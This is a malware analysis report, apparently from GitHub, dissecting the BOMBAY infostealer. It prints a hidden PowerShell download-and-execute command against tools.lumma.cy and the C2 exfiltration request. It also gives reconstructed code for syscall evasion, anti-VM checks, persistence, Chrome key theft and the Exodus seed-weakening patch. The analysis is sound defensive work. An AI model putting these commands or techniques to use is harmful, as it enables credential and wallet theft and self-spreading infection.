<p align="center"><img width="250" height="250" alt="{CA16EF93-797B-49AA-B396-E82A3FE6CB98}" src="https://github.com/user-attachments/assets/5d9f3b2d-66c3-4f6d-a96c-f17148bf6ea4" /></p>

# BOMBAY Stealer

## 1. Introduction

BOMBAY Stealer is a classic piece of modern "vibecode" malware pretending to be a serious, hardened infostealer. Distributed for free under a pseudo-MaaS builder/panel model, it tries hard to project a "premium" image: direct syscalls, Chrome App-Bound Encryption (ABE) bypass, an encrypted C2 upload pipeline, backdated PE timestamps, and even staging infrastructure hosted on `tools.lumma.cy` - a comical nod to the real LummaC2 stealer.

Strip away the borrowed branding and buzzword checklist, however, and what drops out of IDA is a bloated 3.3 MB MSVC++ Frankenstein monster. Instead of tight, custom-obfuscated C, the authors glued together the full SQLite amalgamation, `nlohmann::json` v3.12.0, an Electron ASAR parser, and copy-pasted components straight off GitHub (`xaitax/Chrome-App-Bound-Encryption-Decryption`), while leaving full C++ RTTI, debug log strings, dead syscall slots, a hardcoded default license key, and broken "encryption" whose AES key literally travels in cleartext inside the exact same HTTP request.

| Marketing / Buzzword Facade | What the Binary Actually Does |
| --- | --- |
| **"Lumma"-adjacent branding (`tools.lumma.cy`)** | A free builder stitched together with heavy STL/JSON/SQLite libraries and zero real control-flow obfuscation. |
| **"Custom Direct Syscall Engine"** | Straight copy-paste of Hell's Gate + djb2 from `xaitax/Chrome-App-Bound-Encryption-Decryption`. Three resolved syscalls (`ZwReadVirtualMemory`, `ZwWriteVirtualMemory`, `ZwCreateThreadEx`) have **zero call sites** - the coders took the whole file and forgot to delete the process-hollowing slots they never wired up. |
| **"Chrome 127+ ABE Bypass"** | Also lifted from `xaitax`'s public GitHub PoC and sloppily glued into the stealer with leftover debug strings like `"abe: Sys::InitApi failed (proceeding with Nt* fallbacks)"`. |
| **"Encrypted Exfiltration"** | AES-256-CBC where the key is **`SHA-256(X-License-Key)`** - and `X-License-Key` is sent **in plaintext in the HTTP header of the very same request** (and hardcoded in `.data`). Pure vibecode crypto. |
| **"Stealth C2"** | `WinHttpSetOption(WINHTTP_OPTION_SECURITY_FLAGS, 0x3100)` **deliberately disables TLS certificate validation** (ignores CN, date, and unknown CA). Anyone on the wire can MitM it; anyone with a packet capture can decrypt it. |
| **"String Obfuscation"** | Spends effort splitting `"https://doxbin.cy:2083"` into `mov` immediates in TLS buffers, while shipping **unstripped C++ RTTI** leaking `PkgMeta`, `CredRec`, `StubRuntimeDetail`, `VsProj::FileData`, `pack_pkg_to_buffer`, and `run_vs_projects_scan`. |
| **"Backdated Build"** | PE header `TimeDateStamp` says **2024-12-30** (`/Brepro`-style tampering), while the POGO debug directory entry quietly snitches the **real link time: 2026-10-15 21:42:30 UTC**. |

<img width="608" height="375" alt="{6931568A-D810-40FD-A23D-3373CBBC7E86}" src="https://github.com/user-attachments/assets/b0641969-245f-4b98-9021-254f4f8b264a" />

<img width="1434" height="220" alt="{5D817B07-6FBA-4959-8E33-B4524CE43FAA}" src="https://github.com/user-attachments/assets/84cd6960-e946-4d7c-920a-2ac61c443069" />

---

## 2. Origins, Pseudo-MaaS Plumbing & The `lumma.cy` Irony

While the developers' identities aren't hardcoded in the binary, the builder architecture and delivery chain reveal a low-effort, semi-public operation:

* **Pseudo-Licensed Builder:** No paid subscription model is evident (it circulates as a free builder + web panel), yet the stub drags along a clumsy license-gating mechanism anyway. Every C2 request sends `X-License-Key: <key>`, pulled by `get_license_key` (`0x140042670`) from a `0x40`-byte `.data` slot at `0x140311048`:
  ```text
  0x140311048: "C307-ABE1-D50C-B96A"   ; default key burned into wild build
  0x14031105B: "XXXXXXXX...X"          ; 44 bytes of 'X' padding trimmed at runtime
  ```
  <img width="1258" height="342" alt="{9E89EC06-7EE6-4E6B-8F9D-962D2430066E}" src="https://github.com/user-attachments/assets/c0c9bff7-6dc6-4d7a-80c7-4c0936f0f460" />

  `get_license_key()` copies `0x40` bytes, strips trailing `'X'` and NUL bytes, and accepts anything `>= 8` chars. That's the entire "builder protection": binary patching a padded string in `.data`, shipped with the author's own key `C307-ABE1-D50C-B96A` still sitting inside.
* **Hardcoded Backend:** `get_backend_url` (`0x1400422C0`) materializes `https://doxbin.cy:2083` directly into TLS+`0x88` via `mov` immediates (`https://` auto-prefixed if `"://"` is missing), with `stub_version=1.2.2` hardcoded at TLS+`0x10`.
* **Distribution:** Pushed via Discord DMs using niche-themed lures (e.g., `"spotify"`). Using `tools.lumma.cy` for Stages 2 and 4 is peak irony: LummaC2 is notorious for custom C builds and multi-layered obfuscation, whereas BOMBAY is an unoptimized C++ monolith glued together out of GitHub snippets and off-the-shelf libraries.

---

## 3. Technical Analysis of BOMBAY Stealer - The Real Story

### 3.1. Delivery Chain (Stages 0–4): Polymorphic PHP Slop

The infection chain spans five stages, relying on noisy script handoffs and server-side PHP string randomization rather than genuine stealth:

```text
[Discord DM ("spotify" lure)] ──► Stage 1: DLL dropper (side-load/hijack stub)
  │ DllMain stores &DllMain -> qword_180018A90, DisableThreadLibraryCalls
  │ CreateProcessA(CREATE_NO_WINDOW):
  ▼
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "irm 'https://tools.lumma.cy/cT8I9?-k=U' | iex"
  ▼
Stage 2: Panel UA-gating dispatcher (https://tools.lumma.cy/cT8I9?-k=U)
  ├─ Browser UA    ──► HTA "System Utility" (0x0 window @ -30000,-30000, decoy "<!-- Error 404 -->")
  └─ PowerShell UA ──► Unverified (HTML cannot run under iex; likely dead path or mshta-consumed)
  ▼
Stage 3: PHP-randomized HTA drops 2 of 3 VBS stubs into %TEMP%, runs wscript.exe hidden, deletes after 120s
  │ Ze3C3ZQjwgb7dYLJVJ9e.vbs + XMjZNwhV6AQ3o.vbs (3rd template qHvbobzYhPqU.vbs unused!)
  │ Each runs: powershell.exe -W Hidden -EncodedCommand <base64 UTF-16LE>
  ▼
Stage 4: Textually polymorphic PS loader (identical logic, random variable names per request)
  │ 1. Extract dir = %TEMP%\<11 random lowercase alnum>
  │ 2. Download https://tools.lumma.cy/Br6oAs_cpwZht4JoZ_NJ.png
  │    Fallback chain: Start-BitsTransfer -> Net.WebClient -> Invoke-WebRequest
  │ 3. Dead UTF-8 BOM-strip code (left over from older PHP panel output; endpoint serves raw PK\x03\x04)
  │ 4. Unzip fallback: ZipFile::ExtractToDirectory -> Expand-Archive -> Shell.Application CopyHere(0x14)
  │ 5. Set-Location <extract_dir> (critical so Stage 5 finds .spread_meta via module/CWD path)
  │ 6. Start-Process rename.exe -WindowStyle Hidden
  ▼
Stage 5: %TEMP%\<rand11>\rename.exe + sidecar .spread_meta
```
<img width="490" height="328" alt="{BA0736CD-3A96-45C5-936B-A99534E6354B}" src="https://github.com/user-attachments/assets/e1bf2d2f-b6a0-41d6-96e6-199de75cb5a3" />

* **Why two VBS stubs?** Because the Stage 4 loader has zero retry logic if Stage 5 trips. So the authors simply fire **two** identical PowerShell chains in parallel and let Stage 5 sort out the race with a clumsy mutex + event takeover (`acquire_single_instance_mutex`, `0x1400DD140`).
* **Fake ZIP Polymorphism:** Probing `Br6oAs_cpwZht4JoZ_NJ.png` across User-Agents and 3.5-second intervals proves the server serves one immutable Stage 5 build (`rename.exe` CRC `0xE1D90BA4`, `.spread_meta` CRC `0x83C805EF`). The SHA-256 of the ZIP changes per request solely because PHP re-zips `.spread_meta` on the fly, bumping its 2-second DOS mtime.
* **The Worm Feedback Loop:** Stage 0 isn't purely external. Once Stage 5 compromises a machine, `stealer_worker_discord` (`0x1400B7090`) runs a backend-gated **Discord worm** (`"discord_grabber: scheduling worm spread (detached)"`) using messages pulled from `/init` to DM the victim's own contacts - turning infected users into Stage 0 distributors while `.spread_meta` (`{"campaign_id":1933,"slug":"dll/73f20eb078d334d8","niche":"spotify"}`) tracks every generation back to the panel.

---

### 3.2. Binary Bloat, `.fptable` Red Herring & Obfuscation Theater

Built with MSVC 19.50 (VS2026) and static CRT, `rename.exe` (PE64 GUI, 7 sections, no overlay, unsigned, masquerading in `.rsrc` as `WindowsUpdate.exe` / "Microsoft Software Update") is massive for a stealer - and 90% of that bulk is **statically linked third-party code**:

* **248 unmarked import-lib objects** in the Rich header alongside builds `33145`, `35207`, and `35228` (final link `35228`).
* Full **SQLite amalgamation** (plaintext SQL strings everywhere in `.rdata`).
* Full **`nlohmann::json` v3.12.0** (`json_abi_v3_12_0` sitting in RTTI).
* A full **ASAR archive parser/packer** (repurposed for both exfil and Electron wallet patching).
<img width="1489" height="631" alt="{DE5ABFBF-5EB3-4BDC-9221-8376C1B9FD19}" src="https://github.com/user-attachments/assets/ec29a4a3-c941-4684-b2f6-5554ebfbcd0a" />

**The `.fptable` Red Herring:** At VA `0x14033F000`, the binary contains a custom `0x100`-byte section named `.fptable`, zeroed on disk. On surface triage, it screams "malware API dispatch table." In reality, it is nothing more than the **statically-linked UCRT's lazy NLS/WinRT API-set thunk table** (`UCRT_FPTABLE`), resolved on demand by `ucrt_fptable_resolve_slot` (`0x1402201F0`) under `__vcrt_lock` (`AreFileApisANSI`, `CompareStringEx`, `LCMapStringEx`, `RoInitialize`, etc.).

**The Giant TLS Scratchpad & Inconsistent Obfuscation:** While the TLS directory (`0x1402CCA40`, `0x17C4C` bytes) has an empty callback array, it acts as a massive per-thread global struct accessed via `TlsIndex` (`+0x1C0` User-Agent, `+0x240` HTTP verb, `+0x88` backend URL, `+0x40B8` WinHTTP DLL name, `+0xE5xx` log ring buffer, `+0x16Axx` ABE buffers). Operational strings are "hidden" using three mismatched schemes:

1. **mov-immediate splitting** (dominant): strings like `https://doxbin.cy:2083`, `"Backend URL not configured"`, and `"License Key not configured"` never appear as contiguous bytes in raw file scans - the compiler emits immediate stores directly into TLS buffers:
   ```c
   // get_backend_url (0x1400422C0), reconstructed
   strcpy(tls + 0x88, "https://doxbin.cy:2083"); // 5x mov qword imm64 in .text
   if (strstr(cached, "://") == NULL)            // 0x2F2F3A built as one dword
       cached = "https://" + cached;
   ```
2. **dword-built UTF-16** for DLL/API names:
   ```c
   // winhttp_dynamic_init (0x1400755C0)
   *(uint32_t*)(tls + 0x40B8) = 0x00690077; // L"wi"
   *(uint32_t*)(tls + 0x40BC) = 0x0068006E; // L"nh"
   *(uint32_t*)(tls + 0x40C0) = 0x00740074; // L"tt"
   *(uint32_t*)(tls + 0x40C4) = 0x002E0070; // L"p."
   *(uint32_t*)(tls + 0x40C8) = 0x006C0064; // L"dl"
   *(uint32_t*)(tls + 0x40CC) = 0x0000006C; // L"l\0"
   HMODULE hMod = LoadLibraryW((LPCWSTR)(tls + 0x40B8));
   ```
3. **Rolling XOR** used on literally **two** log strings (`byte_14025D768`, `byte_140253F88`), e.g.:
   ```c
   // rolling_xor_decode, reconstructed (seed = 0x33 or 0x03)
   const char *rolling_xor_decode(uint8_t *dst, const uint8_t *src, size_t n, uint8_t seed) {
       uint8_t k = seed;
       for (size_t i = 0; i < n; i++) {
           dst[i] = src[i] ^ k;
           k = (uint8_t)((i + k) & 0x7F);
       }
       dst[n] = '\0';
       return (const char *)dst; // "Failed to initialize syscalls - falling back to standard APIs"
   }
   ```

All this `mov`-immediate theater to hide a few strings, yet the authors compiled with **RTTI turned on**, handing analysts `PkgMeta`, `CredRec`, `StubRuntimeDetail`, `VsProj::FileData`, `pack_pkg_to_buffer`, and `run_vs_projects_scan` on a silver platter.

---

### 3.3. Copy-Pasted "Stealth": `xaitax`'s Syscall Engine & ABE Bypass

At first glance, the binary looks like it implements an advanced direct-syscall layer (`syscalls_init_hellsgate` at `0x140064C40`) and a Chrome 127+ App-Bound Encryption bypass (`abe_capture_master_key` at `0x1401E84C0`). Look closer, and the illusion collapses: **this isn't original malware engineering - it's an awkward copy-paste of Alexander Hagenah's public GitHub project `xaitax/Chrome-App-Bound-Encryption-Decryption`**.

In `xaitax`'s public PoC, Hell's Gate with djb2-hashed `Zw*`/`Nt*` exports, `syscall; ret` trampolines, handle duplication, COM elevation abuse, and a named-pipe IPC server are used together to perform fileless reflective process hollowing into a suspended browser. BOMBAY's authors ripped out the syscall resolver and ABE module and shoved them straight into their MSVC++ stealer:

```c
struct SYSCALL_REC {          // 0x10 bytes; g_syscall_recs[23] @ 0x140317820
    void     *syscall_ret_addr; // -> 'syscall; ret' (0F 05 C3) inside ntdll Zw* stub
    uint32_t  arg_count;        // static table value == Zw* parameter count
    uint16_t  table_idx;
    uint16_t  _pad;
};

// syscalls_init_hellsgate (0x140064C40), reconstructed
bool syscalls_init_hellsgate(void) {
    if (g_syscalls_ready) return true; // 0x140317990
    PEB *peb = (PEB *)__readgsqword(0x60); // ONLY gs:[60h] in .text
    for (entry = peb->Ldr->InMemoryOrderModuleList.Flink; ; entry = entry->Flink) {
        build_wide(tls + 0x2690, L"ntdll.dll");
        if (wcstrik(NAME(entry), L"ntdll.dll")) break; // 0x140216640
    }
    // Walk IMAGE_EXPORT_DIRECTORY, hash "Zw*" exports with djb2 (seed 5381)
    // Sort stubs (0x1400647E0), match against 23 hardcoded {djb2, rec*, argc} entries,
    // scan <= 0x40 bytes for 0F 05 C3 ("syscall; ret")
    ...
    g_syscalls_ready = true;
    return true;
}
```

<img width="745" height="443" alt="{06AAF73D-4ACC-4B34-8EEF-81FF0F10E9F8}" src="https://github.com/user-attachments/assets/f3bda149-0dbb-47be-8aa8-6cfb3cbaaf76" />

How do we know it was blindly pasted rather than engineered in-house?

1. **Dead Syscall Slots Left Behind:** All 23 `Zw*` exports are resolved at startup (`ZwCreateFile, ZwReadFile, ZwWriteFile, ZwClose, ZwQueryInformationFile, ZwSetInformationFile, ZwTerminateProcess, ZwOpenProcess, ZwAllocateVirtualMemory, ZwProtectVirtualMemory, ZwFreeVirtualMemory, ZwReadVirtualMemory, ZwWriteVirtualMemory, ZwCreateThreadEx, ZwQuerySystemInformation, ZwDelayExecution, ZwCreateSection, ZwMapViewOfSection, ZwUnmapViewOfSection, ZwQueryDirectoryFile, ZwOpenFile, ZwDuplicateObject, ZwQueryObject`). Yet **`ZwReadVirtualMemory`, `ZwWriteVirtualMemory`, and `ZwCreateThreadEx` have ZERO wrappers and ZERO call sites** anywhere in the binary! Those are the exact syscalls `xaitax`'s tool uses for reflective process hollowing - BOMBAY's coders didn't use that injection flow (or couldn't get it working), ripped out the callers, and forgot to remove the resolved slots from the table.
2. **Half-Baked Adaptation & Leftover Debug Logs:** In `abe_capture_master_key` (`0x1401E84C0`), if `abe_sys_initapi()` (`0x1401FFB30`) fails, it logs `"abe: Sys::InitApi failed (proceeding with Nt* fallbacks)"` directly to the TLS ring buffer, alongside `"abe: exe missing - ..."`, `"abe: no ABE key returned for ..."`, and `"abe: master key captured (N bytes)"`.
<img width="959" height="349" alt="{E15F9324-3B20-426D-AC3D-6E8716F0B220}" src="https://github.com/user-attachments/assets/badf1617-d955-423d-a382-91931ddb27d4" />

3. **Standard IAT Fallback Everywhere:** Despite all the Hell's Gate bravado, `KERNEL32.dll` (`~203` imports including `GetProcAddress`, `LoadLibraryA/W`, `VirtualProtect`, `CreateFileA`) is sitting right in the IAT, and every syscall wrapper lazily falls back to `GetProcAddress` if anything goes wrong:
   ```c
   // acquire_single_instance_mutex (0x1400DD140)
   if (g_syscalls_ready && g_sys_ZwDelayExecution.syscall_ret_addr)
       syscall_ZwDelayExecution(0, &neg_150ms); // 0x140065970
   else if (fn_Sleep_fallback)                  // 0x140317780
       fn_Sleep_fallback(150);                  // GetProcAddress("Sleep")
   ```
   Using `ZwDelayExecution` for a mutex retry sleep loop and `ZwCreateFile`/`ZwWriteFile` to patch Discord's `index.js` while leaving `GetProcAddress` and `CreateFileA` in the IAT is pure cargo-cult evasion.

---

### 3.4. Anti-VM, Tool-Killing Tantrums & Persistence

**Anti-VM Gate (`0x14005ABB0`):** An OR-chain of five basic checks - any hit causes a silent `return 0` from `WinMain`:

```c
// reconstructed from 0x14005ABB0 / 0x140056EF0 / 0x140056DA0 / 0x140056140 / 0x140056720 / 0x1400565D0
bool anti_vm_gate(void) {
    if (antivm_cpuid_hypervisor_bios()) return true; // CPUID 0x40000000 + BIOS whitelist quirk
    if (antivm_guest_registry_keys())   return true; // VMware Tools / VBox Guest Additions / Hyper-V Guest
    if (antivm_bios_version_strings())  return true; // SystemBiosVersion contains vbox|vmware|virtual|qemu
    if (antivm_process_blacklist())     return true; // vmtoolsd / vmwaretray / VBoxService / VBoxTray
    if (antivm_driver_files())          return true; // drivers\VBoxGuest.sys / vmhgfs.sys / vmmouse.sys
    return false;
}
```

The highlight of amateur coding here is inside `antivm_cpuid_hypervisor_bios` (`0x140056EF0`): after checking CPUID leaf `0x40000000` for `"VMware"`, `"VBox"`, `"KVMKVM"`, or `"Microsoft Hv"`, it checks `HKLM\HARDWARE\DESCRIPTION\System -> SystemBiosVersion` against a tiny whitelist of "real" vendors (`"alaska"`, `"american megatrends"`, `"award"`, `"phoenix"`, `"insyde"`, `"lenovo"`). Anything outside that hardcoded list (custom OEMs, certain laptops, locked-down registry reads) gets misclassified as a VM and silently exits.

**178-Tool Kill List (`0x1400576F0`, `0x14005AC10`, `0x14005F2B0`):** Because nothing screams "stealth" like blindly nuking 178 analysis processes on the victim's machine, `build_process_blacklist` builds a bloated list of debuggers, disassemblers, decompilers, sniffers, and DFIR tools (`ida*`, `ghidra*`, `binaryninja`, `x64dbg`, `ollydbg`, `windbg`, `dnspy*`, `ilspy`, `dotpeek*`, `wireshark`, `fiddler*`, `burpsuite`, `mitmproxy`, `procmon*`, `procexp*`, `processhacker`, `systeminformer`, `frida`, `cuckoo`, `fakenet`, `regshot`, `cheatengine*`, `binwalk`, even `gdb`/`pwndbg`/`gef` and Android RE tools like `jadx`/`apktool`). Two sweepers - `kill_blacklisted_processes` (exe name) and `kill_processes_by_image_path` (`0x14005F2B0`, `QueryFullProcessImageNameW` + `memcmp`) - terminate matches via `ZwOpenProcess(PROCESS_TERMINATE)` -> `ZwTerminateProcess(h, 1)`. Loud, noisy, and defeated by renaming `ida64.exe`.

**Mutex Takeover & Persistence (`0x1400DD140`, `0x1400E7D90`):**

* **Single-instance takeover:** If a second instance (from the dual-VBS launch) hits `ERROR_ALREADY_EXISTS` on the mutex, it calls `OpenEventA` + `SetEvent` to kill the first instance's watchdog thread, then polls up to `40 x 150 ms` to claim the mutex.
* **Persistence (`setup_autostart`, `0x1400E7D90`):** Drops a self-extracted copy (stripping `BND!` binder bounds via `map_pe_section_manual`) to `%LOCALAPPDATA%\WindowsRecovery\Update.exe` (via `.tmp` + `MoveFileExW`), sets `FILE_ATTRIBUTE_HIDDEN`, and writes an `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` entry named `WindowsRecovery` via dynamically resolved `advapi32` APIs. `autostart_check_relocated` (`0x1400E2180`) detects execution from this path and bumps `WinMain`'s C2 init retry count from `10` to `36`.

```c
// setup_autostart (0x1400E7D90), reconstructed
bool setup_autostart(void) {
    wchar_t *localappdata = getenv_tls("LOCALAPPDATA");
    if (!localappdata) return false;
    std::wstring dir = std::wstring(localappdata) + L"\\WindowsRecovery";
    CreateDirectoryW(dir.c_str(), NULL);
    std::wstring dest = dir + L"\\Update.exe";
    if (!self_copy_write_file(dest)) return false; // 0x1400E5ED0 (BND! self-extract via .tmp)
    SetFileAttributesW(dest.c_str(), FILE_ATTRIBUTE_HIDDEN);
    // Value name built dword-wise: L"Wi|nd|ow|sR|ec|ov|er|y" -> "WindowsRecovery"
    if (!reg_run_set_dynamic(HKEY_CURRENT_USER, L"WindowsRecovery", dest)) return false;
    return true;
}
```

---

### 3.5. C2 Protocol, Broken "Encryption" & Bolted-On RAT

**Transport (`winhttp_dynamic_init`, `0x1400755C0`):** Loads `winhttp.dll` at runtime and resolves 19 function pointers (`fn_WinHttp*` at `0x140317B58..0x140317BD8`), including the WebSocket quartet (`WinHttpWebSocketCompleteUpgrade/Send/Receive/Close`), logging errors under `"LazyWin::"`.

**Session Handshake (`init_log_session`, `0x140043A10`):**

```http
POST /<backend-path> HTTP/1.1
Host: doxbin.cy:2083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json
X-License-Key: C307-ABE1-D50C-B96A

computer_name=<name>&username=<user>&os_version=<ver>&vm_detected=0|1&stub_version=1.2.2&spread_campaign_id=1933&spread_slug=dll%2F73f20eb078d334d8&spread_niche=spotify&run_source=spread
```

Notice the classic vibecode touch: the header claims `Content-Type: application/json`, while the body is URL-encoded form parameters (`computer_name=...&username=...`) assembled by `load_spread_meta_build_params` (`0x14003D000`) from `.spread_meta`. Meanwhile `WinHttpSetOption(0x1F, 0x3100)` throws TLS certificate verification out the window.

The panel replies with JSON gating the entire stub:

```json
{
  "file_logging": true,
  "hwid_blocked": false,
  "vm_blocked": false,
  "unique_id": "...",
  "ws_token": "...",
  "features": {
    "exe_replacer": 1, "exodus_inject": 1, "discord_inject": 1,
    "discord_grabber": 1, "bip39": 1, "chrome": 1, "screenshot": 1,
    "systeminfo": 1, "extensions": 1, "wallets": 1, "keywords": 1,
    "telegram": 1, "desktop_apps": 1, "firefox": 1, "vs_projects": 1,
    "remote_desktop": 1
  },
  "browsers": ["chrome", "edge", "brave", "..."]
}
```

**Exfil Packaging (`pack_pkg_to_buffer`, `0x1400AAD40`) & Broken Crypto (`encrypt_payload`, `0x1400408E0`):**

Stolen files are packed into an Electron-style ASAR archive keyed by FNV-1a-64 (`0xCBF29CE484222325`, prime `0x100000001B3`):

<img width="1267" height="528" alt="{7BE76C74-F086-4555-B38D-9D46FA62B642}" src="https://github.com/user-attachments/assets/db87487f-30ed-4b1c-b153-08c081f32f78" />

```c
struct ASAR_HDR {
    uint32_t json_size_field; // constant 4
    uint32_t total;           // 8 + padded_json_len
    uint32_t payload_size;    // json_len + pad + 4
    uint32_t json_len;        // nlohmann::json::dump(PkgMeta) length
};

// encrypt_payload (0x1400408E0), reconstructed
std::string encrypt_payload(const std::vector<uint8_t> &plain, const std::string &license_key) {
    uint8_t key[32];
    SHA256((const uint8_t *)license_key.data(), license_key.size(), key); // NO salt, NO KDF!
    uint8_t iv[16];
    BCryptGenRandom(NULL, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    std::vector<uint8_t> ct = AES_256_CBC_Encrypt(key, iv, plain, BCRYPT_BLOCK_PADDING);
    return std::string((char *)iv, 16) + std::string((char *)ct.data(), ct.size());
}
// Sent via upload_encrypted_data (0x140048B60):
// POST <backend>?action=upload&type=<type>&unique_id=<id>
// Header: X-License-Key: <the EXACT key used for SHA-256!>
// Body:   data=<cryptapi_base64_encode(IV || ct)>  (flag 0x40000001, 2 passes)
```

It is hard to overstate how pointless this encryption is: the AES-256 key is literally `SHA-256(X-License-Key)`, and `X-License-Key` is transmitted in cleartext in the **same HTTP request** (and burned into `.data` at `0x140311048`). Decrypting any exfiltrated ASAR takes 5 lines of Python:

```python
import hashlib, base64
from Crypto.Cipher import AES
def decrypt_exfil(b64_blob: str, license_key: str) -> bytes:
    raw = base64.b64decode(base64.b64decode(b64_blob))
    key, iv, ct = hashlib.sha256(license_key.encode()).digest(), raw[:16], raw[16:]
    return AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
```

Upload `type=` values include `log_batch` (via `upload_dispatcher_log_batch`, `0x1400DB530`, shipping the TLS ring buffer logs) and per-item loot via `upload_data_item` (`0x1400D1130`).

**Bolted-On WebSocket RAT (`0x14010B030` -> `0x1400FBDC0` -> `0x140100900`):**

After upgrading to WebSocket (`{"type":"hello","token":<ws_token>}`), `remote_control_ws_loop` handles `ping` -> `pong` inline and spawns a detached thread (`ws_command_thread`, `0x1400FBDC0`) for every other message, routing into a 2057-line handler `ws_command_dispatch_filemgr` (`0x140100900`):

<p align="center">
  <img width="456" height="481" alt="ws_dispatch_1" src="https://github.com/user-attachments/assets/5cd6aaa0-1fda-4c45-a535-6b553709fcad" />
  <img width="466" height="479" alt="ws_dispatch_2" src="https://github.com/user-attachments/assets/bcb05a7f-3da8-4d7c-ab72-19fd17c2e160" />
</p>

| Inbound Command | Request Keys | Outbound Response |
| --- | --- | --- |
| `list_drives` | - | `drives` |
| `list_dir` | `path` | `file_list` / `dir_listing` |
| `delete_path` | `path` | `file_delete` (`is_dir`, `delete_result`) |
| `file_rename` | `path`, `new_name` | `rename_result` |
| `file_mkdir` | `path` | `mkdir_result` |
| *(tail handlers)* | `data` | file read/write/transfer payloads (+ `remote_desktop` / `screenshot` gating) |

---

### 3.6. Stealer, Hijack & Self-Spread Modules

Each collector runs as a feature-gated worker thread (`"Stealer worker start/done: ..."`), using `CredRec` / `PkgMeta` vectors built from `WinMain` (`0x1400C08CD`, `0x1400BF2B0`):

* **Chromium Harvesting & Copied ABE Bypass (`chrome_steal_run`, `0x1401EF620` -> `abe_capture_master_key`, `0x1401E84C0`):**
  Iterates the `/init` browser list with key fallback: **ABE master key -> DPAPI (`"Opera has no ABE"`) -> legacy DPAPI v10 -> skip**. Targets `\Cookies`, `\Network\Cookies`, `\Login Data`, and `\Web Data` via the bloated static SQLite engine, decrypting AES-GCM v10/v20 blobs. The ABE capture routine (`0x1401E84C0`) lifts `xaitax`'s COM/elevation-service named-pipe trick (`0x1401FA800`, `0x1401FB330`, `0x1401FB5C0`) and handle duplicator (`proc_find_and_duplicate_handles`, `0x1400DEBA0` via `ZwDuplicateObject`):
  ```c
  // abe_capture_master_key (0x1401E84C0), reconstructed
  std::optional<std::vector<uint8_t>> abe_capture_master_key(const fs::path &browser_exe) {
      if (!fs::exists(browser_exe)) return std::nullopt;
      if (!abe_sys_initapi()) // 0x1401FFB30
          log("abe: Sys::InitApi failed (proceeding with Nt* fallbacks)"); // leftover debug string
      abe_com_ctx_build(ctx, browser_exe);          // 0x1401FA800
      abe_com_ctx_init(ctx);                        // 0x1401FB330
      std::wstring pipe = abe_build_pipe_name(browser_exe); // 0x1401FB5C0
      pipe_server_create(pipe);                     // 0x1401FB960 (duplex, message-mode)
      pipe_server_wait_client();                    // 0x1401FEF90 (ConnectNamedPipe)
      auto key = pipe_read_message();               // 0x1401FE470
      if (key.empty()) return std::nullopt;
      log("abe: master key captured (" + std::to_string(key.size()) + " bytes)");
      return key;
  }
  ```
* **Firefox (`stealer_worker_firefox`, `0x1400BD940`):** Runs `extract_firefox_data` (cookies + logins) and `create_firefox_data_tasks` for per-file upload.
* **Discord Grabber + Worm (`0x1400B7090`) & `index.js` Implant (`0x14009BF60`):** `grab_all_discord_tokens()` -> `upload_data_item` (`"consolidated tokens"`), triggers the detached Discord worm using `/init` messages, and `stealer_worker_discord_inject` fetches JS injection code from the backend and writes it into Discord's `index.js` using direct-syscall file APIs (`"Failed to open index.js for writing via syscall"`).
* **Exodus Seed-Theft Clipper (`inject_exodus_app_asar`, `0x1400A6D00`):** Triggered via the `exodus_inject` worker (`0x1400B7070`).
 <img width="462" height="480" alt="{FD2B2741-2CAC-4218-A0FA-7023949EB581}" src="https://github.com/user-attachments/assets/fc78eb33-7d6e-42f4-8a36-97aac14ab741" />

 Unpacks Exodus's `app.asar` (leaving a `.bak` backup) and surgically cripples its security so any newly created wallet generates an attacker-predictable seed:
  ```c
  // inject_exodus_app_asar (0x1400A6D00), reconstructed
  // 1) src/static/wallet.html: strip <meta http-equiv="Content-Security-Policy" ... />
  strip_all(html, "<meta http-equiv=\"Content-Security-Policy\"", "/>");
  // 2) src/app/main/index.js: disable Electron cert validation & widen allowed domains
  patch_js(main_js, "ignore-certificate-errors");
  patch_js(main_js, "domains:\"*" /* or ["server.exodus.io"] */);
  // 3) src/app/wallet/index.js: hook RNG call site ("return Object(o.randomFill)" / "fromBuffer(e));")
  patch_randomfill(wallet_js); // newly generated wallet seeds become deterministic/attacker-known
  asar_pack_and_write("app.asar", ".bak");
  ```
* **VS Projects & Other Workers:** `stealer_worker_vs_projects` (`0x1400BEAA0` -> `run_vs_projects_scan`, `VsProj::FileData`) harvests Visual Studio source repositories. Additional feature flags (`bip39`, `screenshot`, `systeminfo`, `extensions`, `wallets`, `keywords`, `telegram`, `desktop_apps`, `remote_desktop`) are parsed once in `/init` and read via the features struct.
* **`BND!`/`VER!` Binder Self-Spread (`0x140062EA0` -> `0x1400603D0`):** Scans **Desktop / Downloads / Documents** for `.exe` targets, strips/copies icons (`exe_replacer_clear_icons` `0x14005CEC0` / `exe_replacer_set_icons` `0x14005ECC0` via `BeginUpdateResourceW`), and appends the stealer payload wrapped in `BND!` / `VER!` markers (rolling back on error). When executed, infected host binaries re-launch with `--binder-child`, extracting and running the original victim executable via `map_pe_section_manual` (`0x1400E3D50`: `ZwCreateSection(SEC_IMAGE)` -> `ZwMapViewOfSection` with `LoadLibrary` fallback `0x1400DCC40`).

---

## 4. Conclusion

<img width="900" height="239" alt="image" src="https://github.com/user-attachments/assets/956320f3-d253-4fb7-bc8f-bcfbff11a3fd" />

BOMBAY Stealer is a textbook example of modern **vibecode Frankenware** - a noisy, bloated C++ patchwork trying to dress up in stolen credibility. Hosting stages on `tools.lumma.cy` is an especially funny touch: whatever flaws older LummaC2 builds had, at least Lumma's developers wrote their own lean C stealer and obfuscation. BOMBAY's authors couldn't even clean up their GitHub copy-pastes.

They bolted together 3.3 MB of unstripped SQLite, `nlohmann::json`, and Electron ASAR bloat, left full C++ RTTI (`PkgMeta`, `CredRec`, `VsProj::FileData`) wide open, copy-pasted `xaitax`'s entire Hell's Gate + ABE bypass repo while leaving three dead process-hollowing syscalls and `Sys::InitApi` debug strings dangling in the binary, forged a PE timestamp while forgetting the POGO entry, disabled TLS certificate validation, and invented an "encrypted exfil" protocol whose AES-256 key is derived from the exact `X-License-Key` sent in cleartext in the same HTTP header - and hardcoded in `.data` to boot.

